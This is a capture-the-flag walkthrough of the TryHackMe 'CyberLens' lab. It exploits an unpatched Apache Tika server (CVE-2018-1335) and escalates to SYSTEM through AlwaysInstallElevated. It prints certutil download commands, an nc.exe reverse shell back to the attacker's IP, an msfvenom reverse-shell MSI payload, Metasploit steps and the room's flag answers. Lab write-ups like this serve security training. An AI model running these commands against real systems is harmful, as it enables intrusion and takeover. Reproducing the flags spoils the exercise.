- - - 
created : 17-07-2025 

Tags : #easy #detailed 
- - - 
# Objective

Root it .
# First Method - Manual

## Scenario

Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags?

Things to Note

1\. Be sure to add the IP to your /etc/hosts file: `sudo echo 'MACHINE_IP cyberlens.thm' >> /etc/hosts`

2\. Make sure you wait 5 minutes before starting so the VM fully starts each service

## Recon

### Nmap

We can use [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) to scan our target :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
└─$ nmap cyberlens.thm -T5 -Pn -v
PORT      STATE    SERVICE
7/tcp     filtered echo
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
427/tcp   filtered svrloc
445/tcp   open     microsoft-ds
1002/tcp  filtered windows-icfw
1217/tcp  filtered hpss-ndapi
1248/tcp  filtered hermes
1501/tcp  filtered sas-3
1533/tcp  filtered virtual-places
3389/tcp  open     ms-wbt-server
4005/tcp  filtered pxc-pin
4279/tcp  filtered vrml-multi-use
5800/tcp  filtered vnc-http
5985/tcp  open     wsman
7443/tcp  filtered oracleas-https
8093/tcp  filtered unknown
8899/tcp  filtered ospf-lite
9200/tcp  filtered wap-wsp
9666/tcp  filtered zoomcp
12000/tcp filtered cce4x
19283/tcp filtered keysrvr

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.96 seconds
           Raw packets sent: 1698 (74.712KB) | Rcvd: 1008 (40.344KB)

```

We can see a lot of open ports, let's firts visit the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) .

## Enumeration
### WebPage (80)

We have a **Image extractor** :

<img src="../../Flameshots/51bcef8aba357c5fecc6c459f7a7b263.png" alt="51bcef8aba357c5fecc6c459f7a7b263.png" width="502" height="244" class="jop-noMdConv">

So we try put an image and click [Metadata](../../3%20-%20Tags/Hacking%20Concepts/Metadata.md) and does what it says.

We can see with [Developer tools](../../3%20-%20Tags/Hacking%20Concepts/Developer%20tools.md) in browser when we click **Get Metadata** what net call happen :

<img src="../../Flameshots/5e97db702a7c99e5044e2090ddca6066.png" alt="5e97db702a7c99e5044e2090ddca6066.png" width="527" height="223" class="jop-noMdConv">

We can see what is running here  ( nmap missed cause it's not a common port ) :

<img src="../../Flameshots/3d33dbb5483320c54fc0280e6df8fd96.png" alt="3d33dbb5483320c54fc0280e6df8fd96.png" width="295" height="264" class="jop-noMdConv">

So we search for [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md)s :

<img src="../../Flameshots/0be8de443bdb18b22b92cc976c5c0174.png" alt="0be8de443bdb18b22b92cc976c5c0174.png" width="396" height="230" class="jop-noMdConv">

**[CVE-2018-1335](../../3%20-%20Tags/CVEs/CVE-2018-1335.md)** from **Rhino Security** (Tyler works here and created the rorom on THM) .

<img src="../../Flameshots/869b72148cd4ead5ce55cec4be9fbb30.png" alt="869b72148cd4ead5ce55cec4be9fbb30.png" width="308" height="136" class="jop-noMdConv">

So we know our version is unpatched .

## Exploit

We read all the report and we have an exploit :

<img src="../../Flameshots/4511444b8ec50492621a4c8d827e69f2.png" alt="4511444b8ec50492621a4c8d827e69f2.png" width="353" height="155" class="jop-noMdConv">

We can copy it in a file in our working dir and execute it with [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) 3 :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
└─$ python3 exploit.py       
Usage: python3 CVE-2018-1335.py <host> <port> <command>
Example: python3 CVE-2018-1335.py localhost 9998 calc.exe

```

So we need a command and we need a shell so we need to install [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) on the [Vulnerable Machine](../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md) by `locate nc.exe` and then `cp path/nc.exe .` and hosting a simple web server :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

```

Now we transfer :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
└─$ python3 exploit.py cyberlens.thm 61777 "certutil -urlcache -f http://10.8.162.183:8080/nc.exe C:/Users/Public/nc.exe"

```

We should see that in the server :

```
──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.60.241 - - [12/Jul/2025 12:39:40] "GET /nc.exe HTTP/1.1" 200 -
10.10.60.241 - - [12/Jul/2025 12:39:41] "GET /nc.exe HTTP/1.1" 200 -
10.10.60.241 - - [12/Jul/2025 12:39:41] "GET /nc.exe HTTP/1.1" 200 -
10.10.60.241 - - [12/Jul/2025 12:39:42] "GET /nc.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

```

### Netcat - Reverse Shell

We can close it and open a [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener :

```
──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...

```

Now we execute the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
└─$ python3 exploit.py cyberlens.thm 61777 "C:/Users/Public/nc.exe 10.8.162.183 1337 -e cmd.exe"

```

And we check [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener :

```
┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.60.241] 49859
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
cyberlens\cyberlens

```

Boom we have it .

Now we go to Desktop through `cd` and `dir` and catch the first with `type` :

```
C:\Windows\system32>cd C:/Users/CyberLens/Desktop
cd C:/Users/CyberLens/Desktop

C:\Users\CyberLens\Desktop> type user.txt
type user.txt
THM{T1k4-CV3-f0r-7h3-w1n}

```

## Privilege Escalation

### WinPEAS

We can use [WinPEAS](../../3%20-%20Tags/Hacking%20Tools/WinPEAS.md) to auto find potential vectors for the [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we have to transfer the executable from our machine to the target machine :

```
C:\Users\CyberLens\Desktop>certutil -urlcache -f http://10.8.162.183:80/winPEASx86.exe C:\Users\CyberLens\Desktop\winPEASx86.exe
certutil -urlcache -f http://10.8.162.183:80/winPEASx86.exe C:\Users\CyberLens\Desktop\winPEASx86.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\CyberLens\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\CyberLens\Desktop

07/12/2025  11:11 AM    <DIR>          .
07/12/2025  11:11 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/06/2023  07:54 PM                25 user.txt
07/12/2025  11:11 AM        10,156,032 winPEASx86.exe
               4 File(s)     10,157,138 bytes
               2 Dir(s)  14,916,714,496 bytes free

```

And we can run it with `winPEASx86.exe` .

We find AlwaysInstalledElevated enabled :

<img src="../../Flameshots/a92575f19d8abfd5964a8256ee4de576.png" alt="a92575f19d8abfd5964a8256ee4de576.png" width="673" height="69" class="jop-noMdConv">

We search it on Internet and find we can install **MSI** files with elevated permissions and exploit the machine with a [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) l :

### MsfVenom (TCP RevShell)

We copy our [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
└─$ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.8.162.183 LPORT=4444 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi
Found 1 compatible encoders
Attempting to encode payload with 9 iterations of x64/xor
x64/xor succeeded with size 503 (iteration=0)
x64/xor succeeded with size 543 (iteration=1)
x64/xor succeeded with size 583 (iteration=2)
x64/xor succeeded with size 623 (iteration=3)
x64/xor succeeded with size 663 (iteration=4)
x64/xor succeeded with size 703 (iteration=5)
x64/xor succeeded with size 743 (iteration=6)
x64/xor succeeded with size 783 (iteration=7)
x64/xor succeeded with size 823 (iteration=8)
x64/xor chosen with final size 823
Payload size: 823 bytes
Final size of msi file: 159744 bytes
Saved as: AlwaysInstallElevated.msi

```

Now we go back to our Target and download it with our [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.60.241 - - [12/Jul/2025 13:48:03] "GET /AlwaysInstallElevated.msi HTTP/1.1" 200 -
10.10.60.241 - - [12/Jul/2025 13:48:05] "GET /AlwaysInstallElevated.msi HTTP/1.1" 200 -

```

```
C:\Users\CyberLens\Desktop>certutil -urlcache -f http://10.8.162.183:80/AlwaysInstallElevated.msi C:\Users\CyberLens\Desktop\AlwaysInstallElevated.msi                                          
certutil -urlcache -f http://10.8.162.183:80/AlwaysInstallElevated.msi C:\Users\CyberLens\Desktop\AlwaysInstallElevated.msi                                                                     
****  Online  ****                                                                              
CertUtil: -URLCache command completed successfully.

```

Now we setup our listener on the port we enter in the [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
└─$ nc -lvnp 4444  

```

And we execute it (the syntax is on the hacking articles site) :

```
C:\Users\CyberLens\Desktop>msiexec /quiet /qn /i AlwaysInstallElevated.msi 
```

And we have it :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Cybelens]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.60.241] 49913
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

We can search for the root flag :

```
C:\Users\Administrator\Desktop>type admin.txt
type admin.txt
THM{3lev@t3D-4-pr1v35c!}
```

Pwned !!
# Second Method - Metasploit

We can open the [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) console with `msfconsole -q` .

We search for apache tika and use that :

```
┌──(mdn0x㉿mdn0xKali)-[~/…/CHALLENGES/Easy/Cybelens/web-server]
└─$ msfconsole -q
msf6 > search apache tika

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/windows/http/apache_tika_jp2_jscript  2018-04-25       excellent  Yes    Apache Tika Header Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/apache_tika_jp2_jscript

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/apache_tika_jp2_jscript) > 

```

We set RHOSTS amd RPORT and LPORT :

```
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rhosts cyberlens.thm
rhosts => cyberlens.thm
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rport 61777
rport => 61777
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set lport 4443
lport => 4443

```

And now run :

```
msf6 exploit(windows/http/apache_tika_jp2_jscript) > run


```

This is going to do all the process we show manually and give us a meterpreter shell :

We can background, search for AlwaysInstallElevated , use it, set options (session 1) and run:

Now we can check `getuid` and we get the server username .

From here we can **Privilege Esc** .

